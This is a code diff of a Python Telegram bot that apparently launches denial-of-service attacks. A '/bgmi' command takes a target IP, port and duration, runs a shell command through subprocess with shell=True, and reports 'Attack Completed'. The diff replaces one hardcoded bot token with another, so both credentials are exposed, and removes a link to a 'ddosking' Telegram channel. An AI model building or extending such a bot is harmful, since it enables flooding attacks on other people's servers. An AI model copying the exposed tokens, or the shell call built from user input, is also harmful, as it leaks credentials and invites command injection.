@@ -7,7 +7,7 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('8112121634:AAG6RBw5ORjMtp443YhmxsR5xAfVqoT4xdE')
+bot = telebot.TeleBot('8061971240:AAGjyTDb6Pr-ZfGyG9mBOdLIphFWzo-HiwE')
 
 # Admin user IDs
 admin_id = ["6882674372"]
@@ -245,8 +245,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"Attack Completed ✅"
         else:
-            response = "✅ /bgmi <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>\n\n"
-                    "JOIN CHANNEL :- https://t.me/ddosking001"# Updated command syntax
+            response = "✅ /bgmi <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>"# Updated command syntax
     else:
         response = "🚫 Unauthorised Access! 🚫"
 
